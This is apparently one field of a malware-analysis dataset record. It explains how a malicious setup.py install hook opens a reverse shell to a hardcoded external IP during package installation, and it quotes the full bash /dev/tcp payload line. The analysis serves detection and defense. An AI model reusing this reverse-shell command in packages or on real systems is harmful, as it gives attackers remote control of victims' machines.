      "malicious_behavior": "This code is malicious. It defines a custom setuptools install command (CustomInstallCommand) that, when the package is installed (via pip or setup.py), executes a shell command to open a reverse shell to a hardcoded external IP address (114.116.119.253) on port 7777. The command 'bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'' is a classic reverse shell payload, which gives an attacker remote command execution capabilities on the victim's machine. Embedding this in a setup.py install hook is a hallmark of supply chain attacks, as it will execute automatically during package installation without user consent or notification. There is no legitimate reason for a package to open a reverse shell during installation, and the use of a hardcoded, non-corporate IP address further confirms malicious intent.",
